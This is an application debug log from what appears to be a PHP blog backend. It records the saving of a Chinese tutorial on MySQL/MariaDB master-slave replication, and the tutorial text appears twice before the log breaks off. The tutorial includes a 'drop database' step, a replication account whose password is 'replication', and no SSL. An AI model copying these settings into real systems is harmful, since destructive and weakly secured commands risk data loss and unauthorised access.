传输到slave上scp&nbsp;/root/test.sql&nbsp;root@192.168.108.140:/opt/</pre><p style="color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);">slave:</p><pre>//进入slave的数据库mysql&nbsp;-u***&nbsp;-p***//清空test数据库drop&nbsp;database&nbsp;test//导入master的test数据库信息source&nbsp;/opt/test.sql</pre><p style="color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);"><strong>2.配置master和slave上的mysql数据库</strong></p><p style="color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);">master:</p><pre>//修改master的my.cnf文件vim&nbsp;/etc/my.cnf//master配置如下，在[mysqld]下添加如下配置#log-bin
server-id&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;1log_bin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;master-bin
expire_logs_days&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;10max_binlog_size&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;100M
binlog-do_db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;test
binlog_ignore_db&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;mysql
//重启mysql数据库service&nbsp;mysqld&nbsp;restart//如果安装的是mariadb可以重启mariadbsystemctl&nbsp;restart&nbsp;mariadb.service</pre><p style="color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);">slave:</p><pre>//修改slave的my.cnf文件vim&nbsp;/etc/my.cnf//slave配置如下，在[mysqld]下添加如下配置
server-id&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;2//重启mysql数据库service&nbsp;mysqld&nbsp;restart//如果安装的是mariadb可以重启mariadbsystemctl&nbsp;restart&nbsp;mariadb.service</pre><p style="color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);">简单说明一下参数配置，保证主备server-id唯一。在master上需要开启mysql的binlog，log_bin=master_bin，指定binlog文件的名称。</p><p style="color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);"><strong>3.创建一个复制用户，具有replication&nbsp;slave&nbsp;权限，能保证slave能把master的数据同步过去</strong></p><p style="color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);">master:</p><pre>grant&nbsp;replication&nbsp;slave&nbsp;on&nbsp;*.*&nbsp;to&nbsp;&#39;replication&#39;@&#39;192.168.108.140&#39;&nbsp;identified&nbsp;by&nbsp;&#39;replication&#39;;</pre><p style="color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);"><strong>4.获取master的binlog位置</strong></p><p style="color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);">master：</p><pre>//进入mysql数据库mysql&nbsp;-u***&nbsp;-p***//设置读锁flush&nbsp;tables&nbsp;with&nbsp;read&nbsp;lock;//获取mysql的binlog文件信息和偏移量show&nbsp;master&nbsp;status;
+-------------------+----------+--------------+------------------+
|&nbsp;File&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;Position&nbsp;|&nbsp;Binlog_Do_DB&nbsp;|&nbsp;Binlog_Ignore_DB&nbsp;|
+-------------------+----------+--------------+------------------+
|&nbsp;master-bin.000010&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3713&nbsp;|&nbsp;test&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;mysql&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|
+-------------------+----------+--------------+------------------+
1&nbsp;row&nbsp;in&nbsp;set&nbsp;(0.00&nbsp;sec)//解锁unlock&nbsp;tables;</pre><p style="color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);"><strong>5.设置备端数据库</strong></p><pre>//进入mysql数据库mysql&nbsp;-u***&nbsp;-p***
//停止slavestop&nbsp;slave;
//设置对应master的binlog信息
MariaDB&nbsp;[(none)]&gt;&nbsp;change&nbsp;master&nbsp;to&nbsp;&nbsp;&nbsp;&nbsp;
-&gt;&nbsp;master_host=&#39;192.168.108.133&#39;,&nbsp;&nbsp;&nbsp;&nbsp;
-&gt;&nbsp;master_user=&#39;replication&#39;,&nbsp;&nbsp;&nbsp;&nbsp;
-&gt;&nbsp;master_password=&#39;replication&#39;,&nbsp;&nbsp;&nbsp;&nbsp;
-&gt;&nbsp;master_log_file=&#39;master-bin.000010&#39;,&nbsp;&nbsp;&nbsp;&nbsp;
-&gt;&nbsp;master_log_pos=3713;//启动slavestart&nbsp;slave;</pre><p style="color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);"><strong>6.查看备端状态</strong></p><pre>MariaDB&nbsp;[(none)]&gt;&nbsp;show&nbsp;slave&nbsp;status\\G;***************************&nbsp;1.&nbsp;row&nbsp;***************************
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Slave_IO_State:&nbsp;Waiting&nbsp;for&nbsp;master&nbsp;to&nbsp;send&nbsp;event
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Master_Host:&nbsp;192.168.108.133
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Master_User:&nbsp;replication
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Master_Port:&nbsp;3306
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Connect_Retry:&nbsp;60
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Master_Log_File:&nbsp;master-bin.000010
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Read_Master_Log_Pos:&nbsp;3881
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Relay_Log_File:&nbsp;mariadb-relay-bin.000002
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Relay_Log_Pos:&nbsp;698
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Relay_Master_Log_File:&nbsp;master-bin.000010
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Slave_IO_Running:&nbsp;Yes
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Slave_SQL_Running:&nbsp;Yes
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Replicate_Do_DB:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Replicate_Ignore_DB:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Replicate_Do_Table:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Replicate_Ignore_Table:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Replicate_Wild_Do_Table:
&nbsp;&nbsp;Replicate_Wild_Ignore_Table:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Last_Errno:&nbsp;0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Last_Error:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Skip_Counter:&nbsp;0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Exec_Master_Log_Pos:&nbsp;3881
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Relay_Log_Space:&nbsp;994
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Until_Condition:&nbsp;None
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Until_Log_File:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Until_Log_Pos:&nbsp;0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Master_SSL_Allowed:&nbsp;No
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Master_SSL_CA_File:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Master_SSL_CA_Path:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Master_SSL_Cert:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Master_SSL_Cipher:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Master_SSL_Key:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Seconds_Behind_Master:&nbsp;0Master_SSL_Verify_Server_Cert:&nbsp;No
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Last_IO_Errno:&nbsp;0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Last_IO_Error:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Last_SQL_Errno:&nbsp;0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Last_SQL_Error:
&nbsp;&nbsp;Replicate_Ignore_Server_Ids:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Master_Server_Id:&nbsp;1
1&nbsp;row&nbsp;in&nbsp;set&nbsp;(0.00&nbsp;sec)

ERROR:&nbsp;No&nbsp;query&nbsp;specified</pre><p>&nbsp;</p><pre style="color: rgb(51, 51, 51); font-size: 14px; text-align: justify; background-color: rgb(250, 250, 252);">如果：Slave_IO_Running:&nbsp;Yes,Slave_SQL_Running:&nbsp;Yes则为配置成功，配置错误重复上面操作即可。
如果解决不了可通过查看mysql日志分析处理。</pre><pre>vim&nbsp;/var/log/mariadb/mariadb.log</pre><p style="color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);"><strong>7.测试</strong>。其实测试没啥好写的，配置成功之后直接连到主从数据库，在master上改变表、字段、数据，slave会同步变化。</p><p style="color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);"><strong>写在最后：</strong>当时想的试一试能不能用mysql自带的功能做数据库灾备，后来发现mysql数据库主从同步会有一些问题。第一个不好脚本化的东西是在同步之前需保证两边的数据库初始信息一样，因为备端配置的mysql-binlog位置只是当前主数据库信息的位置，在该位置之前的数据只能通过人工导入。第二个就是mysql主从同步时，只能进行数据库的增量同步，不能进行全量同步；还有就是如果备端出现脏数据，多了一条数据，当主那边新增一条主键相同的数据，则同步失败。之后我会尝试的能不能把这些操作脚本化，发现mysql自带的同步功能限制性很大，并且手工干预的东西太多了。</p><p><br/></p>',
  'is_tui' => '1',
  'status' => '1',
  'views' => '1',
  'auth' => '韩会强',
)
[ info ] [ RUN ] app\admin\controller\Article->add_article[ /yjdata/www/hhqblog/application/admin/controller/Article.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000294s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000826s ]
[ sql ] [ SQL ] INSERT INTO `think_article` (`title` , `cate_id` , `type` , `keyword` , `remark` , `content` , `is_tui` , `status` , `views` , `auth` , `photo` , `ip` , `update_time` , `create_time`) VALUES ('MySQL数据库主从同步' , 22 , 0 , 'MySQL,主从同步,主从配置' , '主从复制是实现读写分离的技术之一，也是实现读写分离的前提条件。\r\n做读写分离时最重要的就是确保读库和写库的数据统一，而主从复制是实现数据统一最简单的方法（并不能够保证强数据一致性）。\r\n读写分离，顾名思义，就是一个表只负责向前台页面展示数据，而后台管理人员对表的增删改查在另一个表中，把两个表分开，就是读写分离。\r\n主从复制则是一个表数据增删改之后会即时更新到另一个表中，保证两个表的数据一致。' , '<p style=\"color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);\"><strong>环境：</strong></p><p style=\"color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);\">Mater: &nbsp;&nbsp;<a href=\"http://www.linuxidc.com/topicnews.aspx?tid=14\" target=\"_blank\" title=\"CentOS\" style=\"color: rgb(179, 43, 213);\">CentOS</a>7.1 &nbsp;5.5.52-MariaDB &nbsp;192.168.108.133</p><p style=\"color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);\">Slave: &nbsp; CentOS7.1 &nbsp;5.5.52-MariaDB &nbsp;192.168.108.140</p><p style=\"color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);\"><strong>1.导出主服务数据，将主备初始数据同步</strong></p><p style=\"color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);\">master:</p><pre>//从master上导出需要同步的数据库信息mysqldump&nbsp;-u***&nbsp;-p***&nbsp;--database&nbsp;test&nbsp;&gt;&nbsp;test.sql//将master上的备份信息\r\n传输到slave上scp&nbsp;/root/test.sql&nbsp;root@192.168.108.140:/opt/</pre><p style=\"color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);\">slave:</p><pre>//进入slave的数据库mysql&nbsp;-u***&nbsp;-p***//清空test数据库drop&nbsp;database&nbsp;test//导入master的test数据库信息source&nbsp;/opt/test.sql</pre><p style=\"color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);\"><strong>2.配置master和slave上的mysql数据库</strong></p><p style=\"color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);\">master:</p><pre>//修改master的my.cnf文件vim&nbsp;/etc/my.cnf//master配置如下，在[mysqld]下添加如下配置#log-bin\r\nserver-id&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;1log_bin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;master-bin\r\nexpire_logs_days&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;10max_binlog_size&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;100M\r\nbinlog-do_db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;test\r\nbinlog_ignore_db&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;mysql\r\n//重启mysql数据库service&nbsp;mysqld&nbsp;restart//如果安装的是mariadb可以重启mariadbsystemctl&nbsp;restart&nbsp;mariadb.service</pre><p style=\"color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);\">slave:</p><pre>//修改slave的my.cnf文件vim&nbsp;/etc/my.cnf//slave配置如下，在[mysqld]下添加如下配置\r\nserver-id&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;2//重启mysql数据库service&nbsp;mysqld&nbsp;restart//如果安装的是mariadb可以重启mariadbsystemctl&nbsp;restart&nbsp;mariadb.service</pre><p style=\"color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);\">简单说明一下参数配置，保证主备server-id唯一。在master上需要开启mysql的binlog，log_bin=master_bin，指定binlog文件的名称。</p><p style=\"color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);\"><strong>3.创建一个复制用户，具有replication&nbsp;slave&nbsp;权限，能保证slave能把master的数据同步过去</strong></p><p style=\"color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);\">master:</p><pre>grant&nbsp;replication&nbsp;slave&nbsp;on&nbsp;*.*&nbsp;to&nbsp;&#39;replication&#39;@&#39;192.168.108.140&#39;&nbsp;identified&nbsp;by&nbsp;&#39;replication&#39;;</pre><p style=\"color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);\"><strong>4.获取master的binlog位置</strong></p><p style=\"color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);\">master：</p><pre>//进入mysql数据库mysql&nbsp;-u***&nbsp;-p***//设置读锁flush&nbsp;tables&nbsp;with&nbsp;read&nbsp;lock;//获取mysql的binlog文件信息和偏移量show&nbsp;master&nbsp;status;\r\n+-------------------+----------+--------------+------------------+\r\n|&nbsp;File&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;Position&nbsp;|&nbsp;Binlog_Do_DB&nbsp;|&nbsp;Binlog_Ignore_DB&nbsp;|\r\n+-------------------+----------+--------------+------------------+\r\n|&nbsp;master-bin.000010&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3713&nbsp;|&nbsp;test&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;mysql&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|\r\n+-------------------+----------+--------------+------------------+\r\n1&nbsp;row&nbsp;in&nbsp;set&nbsp;(0.00&nbsp;sec)//解锁unlock&nbsp;tables;</pre><p style=\"color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);\"><strong>5.设置备端数据库</strong></p><pre>//进入mysql数据库mysql&nbsp;-u***&nbsp;-p***\r\n//停止slavestop&nbsp;slave;\r\n//设置对应master的binlog信息\r\nMariaDB&nbsp;[(none)]&gt;&nbsp;change&nbsp;master&nbsp;to&nbsp;&nbsp;&nbsp;&nbsp;\r\n-&gt;&nbsp;master_host=&#39;192.168.108.133&#39;,&nbsp;&nbsp;&nbsp;&nbsp;\r\n-&gt;&nbsp;master_user=&#39;replication&#39;,&nbsp;&nbsp;&nbsp;&nbsp;\r\n-&gt;&nbsp;master_password=&#39;replication&#39;,&nbsp;&nbsp;&nbsp;&nbsp;\r\n-&gt;&nbsp;master_log_file=&#39;master-bin.000010&#39;,&nbsp;&nbsp;&nbsp;&nbsp;\r\n-&gt;&nbsp;master_log_pos=3713;//启动slavestart&nbsp;slave;</pre><p style=\"color: rgb(51, 51, 51); font-family: tahoma, 宋体; font-size: 14px; text-align: justify; white-space: normal; background-color: rgb(250, 250, 252);\"><strong>6.查看备端状态</strong></p><pre>MariaDB&nbsp;[(none)]&gt;&nbsp;show&nbsp;slave&nbsp;status\\G;***************************&nbsp;1.&nbsp;row&nbsp;***************************\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Slave_IO_State:&nbsp;Waiting&nbsp;for&nbsp;master&nbsp;to&nbsp;send&nbsp;event\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Master_Host:&nbsp;192.168.108.133\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Master_User:&nbsp;replication\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Master_Port:&nbsp;3306\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Connect_Retry:&nbsp;60\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Master_Log_File:&nbsp;master-bin.000010\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Read_Master_Log_Pos:&nbsp;3881\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Relay_Log_File:&nbsp;mariadb-relay-bin.000002\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Relay_Log_Pos:&nbsp;698\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Relay_Master_Log_File:&nbsp;master-bin.000010\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Slave_IO_Running:&nbsp;Yes\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Slave_SQL_Running:&nbsp;Yes\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Replicate_Do_DB:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Replicate_Ignore_DB:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Replicate_Do_Table:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Replicate_Ignore_Table:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Replicate_Wild_Do_Table:\r\n&nbsp;&nbsp;Replicate_Wild_Ignore_Table:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Last_Errno:&nbsp;0\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Last_Error:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Skip_Counter:&nbsp;0\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Exec_Master_Log_Pos:&nbsp;3881\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Relay_Log_Space:&nbsp;994\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Until_Condition:&nbsp;None\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Until_Log_File:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Until_Log_Pos:&nbsp;0\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Master_SSL_Allowed:&nbsp;No\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Master_SSL_CA_File:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Master_SSL_CA_Path:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Master_SSL_Cert:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs